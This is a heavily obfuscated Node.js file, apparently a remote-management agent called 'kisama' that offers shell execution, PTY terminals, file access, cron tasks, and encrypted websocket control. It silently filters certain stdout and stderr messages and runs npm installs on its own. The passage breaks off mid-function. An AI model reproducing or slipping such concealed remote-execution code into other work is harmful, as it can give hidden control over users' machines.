#!/usr/bin/env node
const a0ch = a0b;
(function (a, b) {
    const cg = a0b, c = a();
    while (!![]) {
        try {
            const d = parseInt(cg(0x53a)) / 0x1 + -parseInt(cg(0x94d)) / 0x2 + parseInt(cg(0x785)) / 0x3 * (-parseInt(cg(0x81d)) / 0x4) + parseInt(cg(0x2aa)) / 0x5 * (parseInt(cg(0x42e)) / 0x6) + parseInt(cg(0x5f5)) / 0x7 + -parseInt(cg(0x5ee)) / 0x8 * (-parseInt(cg(0x44c)) / 0x9) + -parseInt(cg(0xac1)) / 0xa;
            if (d === b)
                break;
            else
                c['push'](c['shift']());
        } catch (f) {
            c['push'](c['shift']());
        }
    }
}(a0a, 0xa338a));
const a0c = [
    a0ch(0x165),
    'Failed\x20to\x20parse\x20URL\x20from',
    a0ch(0xa11)
];
function a0d(a) {
    const ci = a0ch, b = {
            'wTePw': function (c, d) {
                return c === d;
            },
            'XaXYe': ci(0x686),
            'xReWH': function (c) {
                return c();
            }
        };
    return function (c, d, f) {
        const cj = ci, g = c[cj(0x1d9)]();
        if (a0c[cj(0xb7b)](h => g['includes'](h))) {
            if (b[cj(0x9b7)](typeof f, b[cj(0x317)]))
                b[cj(0x421)](f);
            return !![];
        }
        return a['apply'](this, arguments);
    };
}
process[a0ch(0xc53)][a0ch(0x92a)] = a0d(process[a0ch(0xc53)][a0ch(0x92a)]), process[a0ch(0x59e)][a0ch(0x92a)] = a0d(process['stderr']['write']);
const a0f = require(a0ch(0xcda)), a0g = require(a0ch(0xc50)), a0h = require(a0ch(0x481)), a0i = require(a0ch(0x9ce)), a0j = require('tls'), a0k = require(a0ch(0xcac)), a0l = require('fs'), a0m = require('fs')[a0ch(0x5ac)], a0n = require(a0ch(0x991)), a0o = require('path'), a0p = require('os'), a0q = require(a0ch(0x2ac)), {
        exec: a0r,
        spawn: a0s
    } = require(a0ch(0x8da)), a0t = require(a0ch(0xc4f)), a0u = require(a0ch(0x29c)), {encrypt: a0v} = require(a0ch(0x270)), a0w = require(a0ch(0x55e)), a0x = require('express-ws'), a0y = require(a0ch(0x56f));
function a0z() {
    const ck = a0ch, a = {
            'FaHjg': ck(0x312),
            'bzPhQ': ck(0x72e),
            'aIoLX': function (b, c) {
                return b <= c;
            },
            'LfIjH': function (b, c) {
                return b + c;
            },
            'QpCno': function (b, c) {
                return b in c;
            }
        };
    try {
        const b = a0o[ck(0xaa7)](__dirname, a[ck(0x492)]);
        if (!a0l[ck(0x8d6)](b))
            return;
        for (let c of a0l[ck(0x8fc)](b, 'utf8')['split'](/\r?\n/)) {
            let d = c[ck(0x40e)]();
            if (!d || d[ck(0xc9b)]('#'))
                continue;
            if (d[ck(0xc9b)](a[ck(0x234)]))
                d = d[ck(0x88a)](0x7)[ck(0x909)]();
            const f = d[ck(0xfa)]('=');
            if (a[ck(0x1fb)](f, 0x0))
                continue;
            const g = d['slice'](0x0, f)[ck(0x40e)]();
            let h = d[ck(0x88a)](a[ck(0xb35)](f, 0x1))[ck(0x40e)]();
            h['length'] >= 0x2 && (h[ck(0xc9b)]('\x22') && h['endsWith']('\x22') || h[ck(0xc9b)]('\x27') && h[ck(0x5d7)]('\x27')) && (h = h[ck(0x88a)](0x1, -0x1));
            if (g && !a[ck(0xc18)](g, process.env))
                process.env[g] = h;
        }
    } catch (i) {
    }
}
a0z();
let a0A, a0B, a0C = null, a0D = null, a0E = null, a0F = ![];
const a0G = '1.1.2';
function a0H() {
    const cl = a0ch, a = {
            'GDgsl': function (b, c) {
                return b !== c;
            },
            'Anqxp': cl(0xbc1)
        };
    if (a[cl(0x5e3)](process[cl(0xa65)], a['Anqxp']))
        return null;
    try {
        const b = process[cl(0x7a8)][cl(0x598)]();
        if (b[cl(0x159)] && b[cl(0x159)][cl(0x81b)])
            return cl(0xc69);
        if ((b['sharedObjects'] || [])[cl(0xb7b)](c => /(?:ld-musl|libc\.musl)/[cl(0x8d7)](String(c))))
            return 'musl';
    } catch (c) {
    }
    return null;
}
function a0I(a) {
    const cm = a0ch, b = {
            'QkhUX': function (d, f) {
                return d !== f;
            },
            'mnKMg': function (d) {
                return d();
            },
            'pQYsV': cm(0x63b),
            'Fwzgk': cm(0x190),
            'DxOTl': cm(0xd06)
        }, c = b[cm(0x182)](a, undefined) ? a : b[cm(0x187)](a0H);
    if (c === b[cm(0x8ca)])
        return [
            '@qwqo/node-pty',
            b[cm(0x8f2)]
        ];
    return [
        b[cm(0x8f2)],
        b[cm(0x8c9)]
    ];
}
const a0J = [
    'const\x20pty\x20=\x20require(process.env.KISAMA_PTY_PROBE_PATH);',
    a0ch(0x58c),
    a0ch(0x601),
    a0ch(0x3e5),
    a0ch(0x6bb),
    'p.onExit(function\x20()\x20{\x20process.exit(0);\x20});',
    a0ch(0x1a4)
][a0ch(0xaa7)]('\x0a');
function a0K(a) {
    const cn = a0ch, b = {
            'TFQYj': function (c, d) {
                return c(d);
            },
            'eBJCZ': function (c, d) {
                return c > d;
            },
            'GcNzD': function (c, d, f) {
                return c(d, f);
            },
            'jcTlU': function (c, d) {
                return c === d;
            },
            'ZnYny': function (c, d, f) {
                return c(d, f);
            },
            'biRLx': cn(0xb3b),
            'HjgTE': function (c, d) {
                return c(d);
            },
            'IjOrd': function (c, d) {
                return c(d);
            },
            'cTkkw': function (c, d, f, g) {
                return c(d, f, g);
            },
            'VGhfX': 'ignore',
            'xJJXx': cn(0xa7f),
            'TlTit': cn(0x649),
            'DknED': cn(0xb4f),
            'fzqqf': cn(0xadd)
        };
    return new Promise(c => {
        const cr = cn, d = {
                'fxnUL': function (l, m) {
                    return b['TFQYj'](l, m);
                },
                'KbGnh': function (l, m) {
                    const co = a0b;
                    return b[co(0x752)](l, m);
                },
                'rSXCA': function (l, m) {
                    const cp = a0b;
                    return b[cp(0x14d)](l, m);
                },
                'YXquo': function (l, m, n) {
                    return b['GcNzD'](l, m, n);
                },
                'ZuejA': function (l, m) {
                    return b['jcTlU'](l, m);
                },
                'fjIea': function (l, m, n) {
                    const cq = a0b;
                    return b[cq(0xc01)](l, m, n);
                },
                'ScSjU': function (l, m) {
                    return l + m;
                },
                'XdFHS': b[cr(0xcc1)]
            };
        let f;
        try {
            f = require['resolve'](a);
        } catch (l) {
            b[cr(0x35d)](c, {
                'ok': ![],
                'detail': cr(0x807) + b[cr(0x895)](String, l[cr(0x8f9)])['split']('\x0a')[0x0]
            });
            return;
        }
        const g = b[cr(0xc41)](a0s, process[cr(0x9fb)], [
            '-e',
            a0J
        ], {
            'cwd': a0p[cr(0x490)](),
            'env': {
                ...process.env,
                'KISAMA_PTY_PROBE_PATH': f
            },
            'stdio': [
                b['VGhfX'],
                b['VGhfX'],
                b[cr(0x922)]
            ]
        });
        let h = '';
        if (g[cr(0x59e)])
            g[cr(0x59e)]['on'](b[cr(0x4ad)], m => {
                const cs = cr;
                h += d[cs(0x832)](String, m);
                if (d[cs(0x8de)](h['length'], 0x7d0))
                    h = h['slice'](-0x7d0);
            });
        let i = ![];
        const j = (m, n) => {
                !i && (i = !![], d['rSXCA'](c, {
                    'ok': m,
                    'detail': n
                }));
            }, k = setTimeout(() => {
                const ct = cr;
                try {
                    g[ct(0x387)]();
                } catch (m) {
                }
                j(![], ct(0x746));
            }, 0x3a98);
        g['on'](b[cr(0xce6)], m => {
            const cu = cr;
            clearTimeout(k), d[cu(0xa24)](j, ![], cu(0xce5) + m[cu(0x8f9)]);
        }), g['on'](b[cr(0x3a7)], (m, n) => {
            const cv = cr;
            clearTimeout(k);
            if (d[cv(0x1d3)](m, 0x0))
                d['YXquo'](j, !![], 'ok');
            else
                d[cv(0xb0f)](j, ![], cv(0x8d0) + m + cv(0x84b) + n + (h ? d[cv(0xa58)](d['XdFHS'], h['trim']()[cv(0xbb0)]('\x0a')[cv(0x3ff)]()) : ''));
        });
    });
}
function a0L() {
    const cw = a0ch;
    return process[cw(0x127)][0x1] && a0o[cw(0x651)](a0o[cw(0x6ad)](process[cw(0x127)][0x1])) || process[cw(0x72b)]();
}
function a0M(a) {
    const cx = a0ch, b = {
            'PPelz': function (j, k) {
                return j(k);
            },
            'ZFqFA': function (j) {
                return j();
            },
            'JrHPY': function (j, k) {
                return j !== k;
            },
            'GNWLx': cx(0x63b),
            'xFJoo': function (j, k) {
                return j !== k;
            },
            'IVnaD': cx(0xc69),
            'USVWE': cx(0x49b),
            'heAqb': cx(0x157),
            'DTAUV': function (j, k) {
                return j(k);
            }
        };
    if (a0F)
        return Promise[cx(0x6ad)](![]);
    a0F = !![];
    const c = b['ZFqFA'](a0H);
    if (b['JrHPY'](c, b[cx(0x590)]) && b[cx(0x892)](c, b['IVnaD']))
        return Promise[cx(0x6ad)](![]);
    const d = '@qwqo/node-pty-linux-' + process[cx(0x729)] + '-' + c, f = d + '@' + a0G, g = a0L();
    if (!a0l[cx(0x8d6)](a0o[cx(0xaa7)](g, b[cx(0x7d2)])))
        return b[cx(0x602)](a, 'npm\x20自愈跳过:\x20' + g + cx(0x548)), Promise['resolve'](![]);
    const h = cx(0x3a6) + a0G, i = b[cx(0x4ca)];
    return b[cx(0x164)](a, cx(0xc2b) + h + '\x20' + f + cx(0xa14) + g + ')'), new Promise(j => {
        const cz = cx, k = {
                'VWWWM': function (l, m) {
                    return b['PPelz'](l, m);
                },
                'JbAbr': function (l, m) {
                    const cy = a0b;
                    return b[cy(0x602)](l, m);
                },
                'nGjWw': function (l, m) {
                    return b['PPelz'](l, m);
                },
                'PMhiN': function (l, m) {
                    return l(m);
                }
            };
        a0r(cz(0xc7b) + h + '\x20' + f + '\x20' + i, {
            'cwd': g,
            'timeout': 0x15f90
        }, l => {
            const cA = cz;
            if (l) {
                k[cA(0x8e4)](a, cA(0xa88) + k[cA(0xc42)](String, l[cA(0x8f9)])[cA(0xbb0)]('\x0a')[0x0]), k[cA(0xf4)](j, ![]);
                return;
            }
            a('npm\x20自愈完成:\x20' + h + cA(0x638) + f), k[cA(0x30a)](j, !![]);
        });
    });
}
async function a0N(a) {
    const cB = a0ch, b = {
            'YUMsB': function (d) {
                return d();
            },
            'AmCyr': cB(0x125),
            'mdcgZ': cB(0x658),
            'TNLTo': '@qwqo',
            'EjNBl': cB(0xc81),
            'FNZik': cB(0x49b),
            'AXhDY': function (d) {
                return d();
            },
            'iYPMo': function (d, f) {
                return d(f);
            },
            'ajBnA': function (d, f) {
                return d(f);
            },
            'sjJyp': function (d, f) {
                return d + f;
            },
            'nimuu': function (d, f) {
                return d(f);
            },
            'pRdsg': function (d, f) {
                return d(f);
            },
            'HEhaj': cB(0xa0a)
        }, c = b[cB(0x936)](a0I);
    for (const d of c) {
        if (d[cB(0xc9b)](b[cB(0x4f1)])) {
            const h = b[cB(0x936)](a0L), i = a0o[cB(0xaa7)](h, b[cB(0xb42)], b[cB(0x15d)], b['EjNBl'], b[cB(0x61e)]);
            if (a0l[cB(0x8d6)](i)) {
                const j = b['AXhDY'](a0H), k = j ? a0o['join'](h, b['mdcgZ'], cB(0x2af), cB(0x1d1) + process['arch'] + '-' + j, b[cB(0x61e)]) : null;
                if (j && k && !a0l[cB(0x8d6)](k)) {
                    b[cB(0x5d0)](a, cB(0x5c9) + j + cB(0x380));
                    if (!await b['iYPMo'](a0M, a)) {
                        a(cB(0x1be) + d + cB(0x109));
                        continue;
                    }
                }
            }
        }
        let f = null;
        try {
            f = require(d);
        } catch (l) {
            b[cB(0x857)](a, cB(0x1be) + d + cB(0x9cd) + (l && l['code'] ? b[cB(0x8b6)](l[cB(0xa9d)], '\x20') : '') + b['nimuu'](String, l && l[cB(0x8f9)])[cB(0xbb0)]('\x0a')[0x0]);
            continue;
        }
        const g = await b[cB(0xbe4)](a0K, d);
        if (g['ok'])
            return b['iYPMo'](a, cB(0xce3) + d + '\x20(libc=' + (a0H() || b[cB(0x1a8)]) + ')'), {
                'name': d,
                'mod': f
            };
        a(cB(0x1be) + d + cB(0x22f) + g[cB(0x8e3)]);
    }
    return null;
}
function a0O() {
    const cC = a0ch, a = {
            'ivPHi': function (b, c) {
                return b + c;
            },
            'rXKkl': cC(0x664),
            'DcxRW': function (b, c) {
                return b + c;
            },
            'CVpkj': cC(0x865),
            'SxctN': function (b) {
                return b();
            },
            'fuqob': cC(0x168),
            'gWpRp': cC(0xcb1),
            'hHhCw': function (b, c) {
                return b(c);
            }
        };
    if (a0C || a0D)
        return Promise[cC(0x6ad)](a0C);
    return !a0E && (a0E = a[cC(0x9bc)](a0N, b => {
        const cD = cC;
        try {
            a0P['info'](cD(0x664) + b);
        } catch (c) {
            console[cD(0x215)](a[cD(0x292)](a[cD(0x90e)], b));
        }
    })[cC(0x532)](b => {
        const cE = cC;
        return b ? a0C = b[cE(0xc70)] : a0D = a[cE(0xc76)](a[cE(0xc76)](a[cE(0x5eb)], cE(0x8aa) + process[cE(0x729)] + '-' + (a[cE(0xd6a)](a0H) || a[cE(0xafa)]) + '@' + a0G + cE(0x5a9)), a['gWpRp']), a0C;
    })), a0E;
}
if (typeof Bun !== 'undefined')
    try {
        a0C = require('bun-pty');
    } catch (a0ce) {
        a0D = '核心终端依赖\x20(bun-pty)\x20加载失败:\x20' + a0ce[a0ch(0x8f9)];
    }
else {
    if (process[a0ch(0xa65)] !== a0ch(0xbc1))
        try {
            a0C = require(a0ch(0x190));
        } catch (a0cf) {
            a0D = a0ch(0x588) + a0cf['message'] + a0ch(0x719);
        }
}
const a0P = {
    'LEVELS': {
        'DEBUG': 0x0,
        'INFO': 0x1,
        'WARN': 0x2,
        'ERROR': 0x3
    },
    get 'currentLevel'() {
        const cF = a0ch, a = {
                'CzZTI': function (b, c) {
                    return b !== c;
                },
                'HXKVd': cF(0x85d)
            };
        return a[cF(0xd32)](typeof a0a1, a['HXKVd']) && a0a1[cF(0x1f0)] !== undefined ? a0a1['LOG_LEVEL'] : 0x2;
    },
    'debug': a => {
        const cG = a0ch, b = {
                'EiBWW': function (c, d) {
                    return c <= d;
                }
            };
        b[cG(0xaef)](a0P['currentLevel'], a0P['LEVELS'][cG(0x1ec)]) && console['log'](cG(0xa1a) + a);
    },
    'info': a => {
        const cH = a0ch, b = {
                'IQIjw': function (c, d) {
                    return c <= d;
                }
            };
        b[cH(0xc99)](a0P[cH(0xba8)], a0P['LEVELS'][cH(0x713)]) && console[cH(0x215)](cH(0x8ec) + a);
    },
    'warn': a => {
        const cI = a0ch, b = {
                'CFJSu': function (c, d) {
                    return c <= d;
                }
            };
        b[cI(0x6b0)](a0P['currentLevel'], a0P['LEVELS']['WARN']) && console[cI(0x215)](cI(0x9f8) + a);
    },
    'error': a => {
        const cJ = a0ch, b = {
                'XNKpl': function (c, d) {
                    return c <= d;
                }
            };
        b[cJ(0xbe3)](a0P[cJ(0xba8)], a0P['LEVELS']['ERROR']) && console[cJ(0x215)](cJ(0x4c1) + a);
    }
};
function a0Q() {
    const cK = a0ch, a = [
            process.env.USERPROFILE,
            process.env.HOME,
            a0p[cK(0xc80)](),
            process['cwd']()
        ];
    for (const b of a) {
        if (b && a0l['existsSync'](b) && a0l[cK(0x4e2)](b)[cK(0x60e)]())
            return b;
    }
    return process['cwd']();
}
function a0R() {
    const cL = a0ch;
    let a = null;
    try {
        a = a0p[cL(0xc80)]();
    } catch (c) {
    }
    const b = [
        process.env.FILE_ROOT,
        a
    ];
    for (const d of b) {
        if (d && a0l[cL(0x8d6)](d) && a0l[cL(0x4e2)](d)['isDirectory']())
            return d;
        if (d)
            console[cL(0x215)](cL(0x5a8) + d);
    }
    return console['log'](cL(0x53c) + process[cL(0x72b)]()), process[cL(0x72b)]();
}
class a0S {
    constructor(a = 'ok') {
        const cM = a0ch;
        this[cM(0x4dc)] = a;
    }
}
class a0T extends a0S {
    constructor(a = 'ok', b = 0x0) {
        const cN = a0ch;
        super(a), this[cN(0x788)] = b;
    }
}
class a0U extends a0S {
    constructor() {
        const cO = a0ch, a = { 'CyMba': cO(0xce8) }, b = a[cO(0xd6b)]['split']('|');
        let c = 0x0;
        while (!![]) {
            switch (b[c++]) {
            case '0':
                this[cO(0xb92)] = null;
                continue;
            case '1':
                this['virtualization'] = '';
                continue;
            case '2':
                this[cO(0x4e6)] = 0x0;
                continue;
            case '3':
                this[cO(0xcd7)] = 0x0;
                continue;
            case '4':
                this[cO(0x952)] = 0x0;
                continue;
            case '5':
                this['os'] = '';
                continue;
            case '6':
                this[cO(0x729)] = '';
                continue;
            case '7':
                this['kernel_version'] = '';
                continue;
            case '8':
                this[cO(0x124)] = null;
                continue;
            case '9':
                this[cO(0x5de)] = '';
                continue;
            case '10':
                super();
                continue;
            case '11':
                this['mem_total'] = 0x0;
                continue;
            case '12':
                this[cO(0x4fa)] = '';
                continue;
            case '13':
                this[cO(0x126)] = '';
                continue;
            case '14':
                this[cO(0x237)] = [];
                continue;
            case '15':
                this[cO(0x4f9)] = null;
                continue;
            case '16':
                this[cO(0xa8d)] = a0a1[cO(0x11a)];
                continue;
            }
            break;
        }
    }
}
class a0V extends a0S {
    constructor() {
        const cP = a0ch, a = { 'uXbVP': cP(0x1e7) }, b = a['uXbVP'][cP(0xbb0)]('|');
        let c = 0x0;
        while (!![]) {
            switch (b[c++]) {
            case '0':
                this[cP(0xa3c)] = 0x0;
                continue;
            case '1':
                this[cP(0xbae)] = {
                    'up': 0x0,
                    'down': 0x0,
                    'totalUp': 0x0,
                    'totalDown': 0x0
                };
                continue;
            case '2':
                this[cP(0x541)] = {
                    'total': 0x0,
                    'used': 0x0
                };
                continue;
            case '3':
                this[cP(0x657)] = {
                    'tcp': 0x0,
                    'udp': 0x0
                };
                continue;
            case '4':
                this['load'] = {
                    'load1': 0x0,
                    'load5': 0x0,
                    'load15': 0x0
                };
                continue;
            case '5':
                super();
                continue;
            case '6':
                this[cP(0xa4c)] = {
                    'total': 0x0,
                    'used': 0x0
                };
                continue;
            case '7':
                this[cP(0x8f9)] = '';
                continue;
            case '8':
                this['cpu'] = { 'usage': 0x0 };
                continue;
            case '9':
                this[cP(0x2b4)] = 0x0;
                continue;
            case '10':
                this['ram'] = {
                    'total': 0x0,
                    'used': 0x0
                };
                continue;
            }
            break;
        }
    }
}
class a0W extends a0S {
    constructor() {
        const cQ = a0ch;
        super(), this[cQ(0x2e5)] = '', this['exitcode'] = 0x0, this[cQ(0xb37)] = ![], this[cQ(0x36d)] = '';
    }
}
class a0X {
    constructor() {
        const cR = a0ch, a = { 'wDJrN': cR(0xae1) }, b = a['wDJrN'][cR(0xbb0)]('|');
        let c = 0x0;
        while (!![]) {
            switch (b[c++]) {
            case '0':
                this['mtime'] = '';
                continue;
            case '1':
                this[cR(0x4ac)] = '';
                continue;
            case '2':
                this[cR(0x1d4)] = '';
                continue;
            case '3':
                this['type'] = '';
                continue;
            case '4':
                this[cR(0x677)] = 0x0;
                continue;
            case '5':
                this[cR(0x9a7)] = '';
                continue;
            case '6':
                this['mode'] = '';
                continue;
            case '7':
                this[cR(0xc2e)] = '';
                continue;
            }
            break;
        }
    }
}
class a0Y {
    constructor() {
        const cS = a0ch, a = { 'iySxi': '3|1|6|7|4|0|2|5' }, b = a[cS(0xc7f)][cS(0xbb0)]('|');
        let c = 0x0;
        while (!![]) {
            switch (b[c++]) {
            case '0':
                this[cS(0x87d)] = ![];
                continue;
            case '1':
                this[cS(0x1d4)] = '';
                continue;
            case '2':
                this[cS(0x67d)] = ![];
                continue;
            case '3':
                this['path'] = '';
                continue;
            case '4':
                this['type'] = '';
                continue;
            case '5':
                this[cS(0x2a9)] = ![];
                continue;
            case '6':
                this[cS(0x2f3)] = '';
                continue;
            case '7':
                this[cS(0xc2e)] = '';
                continue;
            }
            break;
        }
    }
}
function a0b(a, b) {
    a = a - 0xe9;
    const c = a0a();
    let d = c[a];
    if (a0b['zbTLNA'] === undefined) {
        var e = function (h) {
            const i = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
            let j = '', l = '';
            for (let m = 0x0, n, o, p = 0x0; o = h['charAt'](p++); ~o && (n = m % 0x4 ? n * 0x40 + o : o, m++ % 0x4) ? j += String['fromCharCode'](0xff & n >> (-0x2 * m & 0x6)) : 0x0) {
                o = i['indexOf'](o);
            }
            for (let q = 0x0, r = j['length']; q < r; q++) {
                l += '%' + ('00' + j['charCodeAt'](q)['toString'](0x10))['slice'](-0x2);
            }
            return decodeURIComponent(l);
        };
        a0b['GKddRX'] = e, a0b['bEqRfD'] = {}, a0b['zbTLNA'] = !![];
    }
    const f = c[0x0];
    a0b['FWHqeA'] !== f && (a0b['bEqRfD'] = {}, a0b['FWHqeA'] = f);
    const g = a0b['bEqRfD'][a];
    return g === undefined ? (d = a0b['GKddRX'](d), a0b['bEqRfD'][a] = d) : d = g, d;
}
class a0Z extends a0S {
    constructor() {
        const cT = a0ch;
        super(), this[cT(0x1c6)] = [];
    }
}
class a0a0 {
    static [a0ch(0x4a3)]() {
        const cU = a0ch, a = {
                'yzWES': cU(0xc93),
                'LSZvr': cU(0x3d5),
                'hHomD': cU(0xad4),
                'Sdpvd': function (i, j) {
                    return i !== j;
                },
                'WdKum': cU(0xd18)
            }, {
                privateKey: b,
                publicKey: c
            } = a0k[cU(0xa0e)](a[cU(0x348)]), d = b[cU(0x48d)]({ 'format': a['LSZvr'] }), f = c[cU(0x48d)]({ 'format': 'jwk' }), g = Buffer[cU(0x8c2)](d['d'], a['hHomD']), h = Buffer[cU(0x8c2)](f['x'], a[cU(0x77b)]);
        return (g[cU(0xed)] !== 0x20 || a['Sdpvd'](h['length'], 0x20)) && a0P[cU(0xb4f)]('[🚨\x20严重警告]\x20X25519\x20密钥长度非\x2032\x20字节，Noise\x20协议必定崩溃！'), {
            'private_b64': g[cU(0x1d9)](cU(0xd18)),
            'public_b64': h[cU(0x1d9)](a[cU(0x3e7)])
        };
    }
    static [a0ch(0xcdd)](a) {
        const cV = a0ch, b = this[cV(0x4a3)]();
        return {
            'role': a,
            'private_b64': b[cV(0xb4e)],
            'public_b64': b[cV(0xb17)]
        };
    }
    static [a0ch(0x397)](a = 'Controller', b = a0ch(0x7e2)) {
        const cW = a0ch, c = {
                'control': this[cW(0xcdd)](a),
                'agent': this[cW(0xcdd)](b)
            };
        return c;
    }
}
class a0a1 {
    static [a0ch(0x3b6)] = parseInt(process.env.EXEC_TIMEOUT || '30');
    static [a0ch(0xa45)] = (process.env.EXEC_SHELL || 'true')[a0ch(0xacd)]() === 'true';
    static [a0ch(0x1ec)] = (process.env.DEBUG || a0ch(0x5aa))[a0ch(0xacd)]() === a0ch(0x464);
    static [a0ch(0x683)] = parseInt(process.env.TIMESTAMP_WINDOW || a0ch(0x1d2));
    static ['LOG_LEVEL'] = parseInt(process.env.LOG_LEVEL || (this[a0ch(0x1ec)] ? '0' : '3'), 0xa);
    static [a0ch(0x90c)] = a0a1[a0ch(0xb70)](a0ch(0x91d), a0ch(0xb81)) || 'ECDSA公钥内容';
    static ['ECIES_PUBLIC_KEY_PEM'] = a0a1[a0ch(0xb70)](a0ch(0x682), a0ch(0x9d4)) || 'ECIES公钥内容';
    static [a0ch(0xa5d)] = parseInt(process.env.TEMPKEY_TTL || '24', 0xa);
    static [a0ch(0xa87)] = parseInt(process.env.TEMPKEY_MAX_TTL || '168', 0xa);
    static ['FILE_ROOT'] = a0R();
    static [a0ch(0x7d0)] = parseInt(process.env.MAX_UPLOAD_SIZE || '104857600');
    static ['FOLLOW_SYMLINKS'] = (process.env.FOLLOW_SYMLINKS || a0ch(0x5aa))[a0ch(0xacd)]() === a0ch(0x464);
    static [a0ch(0xc00)] = Number[a0ch(0x2ff)](parseInt(process.env.DOWNLOAD_ENCRYPT_MAX || a0ch(0x76a), 0xa)) ? parseInt(process.env.DOWNLOAD_ENCRYPT_MAX || '4194304', 0xa) : 0x400000;
    static ['FILE_AUDIT_LOG'] = (process.env.FILE_AUDIT_LOG || a0ch(0x464))[a0ch(0xacd)]() === a0ch(0x464);
    static ['InitTask'] = !![];
    static [a0ch(0x5e9)] = [];
    static [a0ch(0xa3e)] = {};
    static [a0ch(0xa5f)] = ![];
    static [a0ch(0x9f1)] = parseInt(process.env.TASK_TIMEOUT || '300');
    static [a0ch(0xc48)] = parseInt(process.env.CRON_INTERVAL || '30');
    static ['onetimetasks_log'] = [];
    static [a0ch(0x57a)] = [];
    static ['MAX_TASK_LOG_SIZE'] = parseInt(process.env.MAX_TASK_LOG || a0ch(0xbc5));
    static [a0ch(0xbcb)] = process.env.HOST || a0ch(0x538);
    static [a0ch(0x5f8)] = parseInt(process.env.KPORT || process.env.PORT || process.env.SERVER_PORT || a0ch(0x560));
    static [a0ch(0x24b)] = ((() => {
        const cX = a0ch, a = {
                'wkDPc': function (c, d) {
                    return c || d;
                }
            }, b = (process.env.KMODE || '0')['trim']();
        return /^2q(?:uic)?$/i[cX(0x8d7)](b) ? '2' : a[cX(0x9f9)](b, '0');
    })());
    static [a0ch(0x426)] = /^2q(?:uic)?$/i[a0ch(0x8d7)]((process.env.KMODE || '')[a0ch(0x40e)]());
    static [a0ch(0x446)] = (process.env.KNAME || '')[a0ch(0x40e)]();
    static [a0ch(0x6db)] = (process.env.KNAME_KEY || '')['trim']();
    static ['KPATH'] = process.env.KPATH || '';
    static [a0ch(0x275)] = (process.env.KISAMA_DNS || a0ch(0x6bc))['trim']()[a0ch(0xacd)]();
    static [a0ch(0x147)] = (process.env.KISAMA_DOH_SERVERS || '')['trim']();
    static [a0ch(0x51d)] = [
        'https://223.5.5.5/resolve',
        a0ch(0x5b8),
        'https://8.8.8.8/resolve'
    ];
    static ['AGENT_VERSION'] = process.env.AGENT_VERSION || '0.6.3-js';
    static [a0ch(0x556)] = a0k[a0ch(0x863)](0x20)[a0ch(0x1d9)](a0ch(0xd18));
    static [a0ch(0x973)] = a0a0['generatePair']();
    static [a0ch(0xf3)]() {
        const cY = a0ch, a = {
                'VgEGy': cY(0xd18),
                'Ldvlt': 'kisama-ws-token-v1'
            };
        return a0k[cY(0xa37)]('sha256', Buffer[cY(0x8c2)](this[cY(0x556)], a[cY(0xc19)]))[cY(0xd44)](a['Ldvlt'])[cY(0x248)](a[cY(0xc19)]);
    }
    static [a0ch(0xcb4)]() {
        const cZ = a0ch, a = {
                'GPekS': cZ(0xd18),
                'tHbGs': cZ(0x1cd)
            }, b = a0a0[cZ(0x397)]();
        this[cZ(0x973)][cZ(0x355)] = b[cZ(0x355)], this[cZ(0x65e)][cZ(0x26d)][cZ(0x1a2)] = b[cZ(0x355)]['private_b64'], this[cZ(0x556)] = a0k[cZ(0x863)](0x20)[cZ(0x1d9)](a[cZ(0xb73)]), this[cZ(0x521)] = null, this[cZ(0x2b0)] = 0x0, a0P[cZ(0x4fe)](a['tHbGs']);
    }
    static [a0ch(0x65e)] = {
        'controller': { 'private': this[a0ch(0x973)][a0ch(0x355)]['private_b64'] },
        'agent': { 'public': this[a0ch(0x973)]['agent'][a0ch(0xb17)] }
    };
    static [a0ch(0x9ed)] = 0xe10;
    static [a0ch(0xac4)] = 0x1e;
    static [a0ch(0xcec)] = 0x3c;
    static [a0ch(0x59d)] = 0x1e;
    static [a0ch(0x2a8)] = null;
    static [a0ch(0x48e)] = null;
    static [a0ch(0x7e4)] = null;
    static [a0ch(0x49e)] = 0x0;
    static [a0ch(0x365)] = 0x0;
    static [a0ch(0x82c)] = null;
    static [a0ch(0xca5)] = null;
    static [a0ch(0x68f)] = 0x0;
    static [a0ch(0x8a8)] = 0x0;
    static ['_baseinfo_net_promise'] = null;
    static [a0ch(0x521)] = null;
    static [a0ch(0x2b0)] = 0x0;
    static ['_status_fetch_promise'] = null;
    static [a0ch(0x549)]() {
        const d0 = a0ch, a = {
                'aWglV': function (b, c) {
                    return b(c);
                },
                'CwUbQ': function (b, c) {
                    return b / c;
                }
            };
        return a[d0(0x921)](Number, a[d0(0xc82)](process[d0(0x2f8)][d0(0x451)](), 0xf4240n));
    }
    static [a0ch(0xa32)](a) {
        return a ? { ...a } : null;
    }
    static async [a0ch(0x886)]() {
        const d1 = a0ch;
        if (this['_baseinfo_p_cache'])
            return this[d1(0xa32)](this['_baseinfo_p_cache']);
        return !this['_baseinfo_p_promise'] && (this['_baseinfo_p_promise'] = new a0ac()[d1(0xcc9)]()[d1(0x818)](a => {
            const d2 = d1;
            return a0P[d2(0x4f6)](d2(0x953) + a[d2(0x8f9)], 0x1), a0ac[d2(0xd25)]();
        })[d1(0x532)](a => {
            const d3 = d1;
            return this[d3(0x2a8)] = a, a;
        })[d1(0x644)](() => {
            const d4 = d1;
            this[d4(0x48e)] = null;
        })), this[d1(0xa32)](await this[d1(0x48e)]);
    }
    static async ['getBaseInfoLocal'](a) {
        const d5 = a0ch, b = {
                'UMlXV': function (d, f) {
                    return d < f;
                },
                'dzFfx': function (d, f) {
                    return d - f;
                },
                'mkjpB': function (d, f) {
                    return d * f;
                },
                'ZBSRd': function (d, f) {
                    return d * f;
                }
            }, c = this[d5(0x549)]();
        if (this[d5(0x7e4)] && b[d5(0x695)](b[d5(0x43b)](c, this[d5(0x49e)]), b[d5(0x904)](this['BASEINFO_LOCAL_TTL'], 0x3e8)))
            return this['_cloneBaseInfoPart'](this[d5(0x7e4)]);
        if (this[d5(0x365)] && b[d5(0x695)](b[d5(0x43b)](c, this['_baseinfo_local_fail_time']), b[d5(0x9b6)](this[d5(0xcec)], 0x3e8)))
            return this[d5(0xa32)](this[d5(0x7e4)] || a0ac[d5(0x497)]());
        return !this['_baseinfo_local_promise'] && (this['_baseinfo_local_promise'] = new a0ac()[d5(0x944)](a)[d5(0x532)](d => {
            const d6 = d5;
            return this[d6(0x7e4)] = d, this[d6(0x49e)] = this[d6(0x549)](), this['_baseinfo_local_fail_time'] = 0x0, d;
        })[d5(0x818)](d => {
            const d7 = d5;
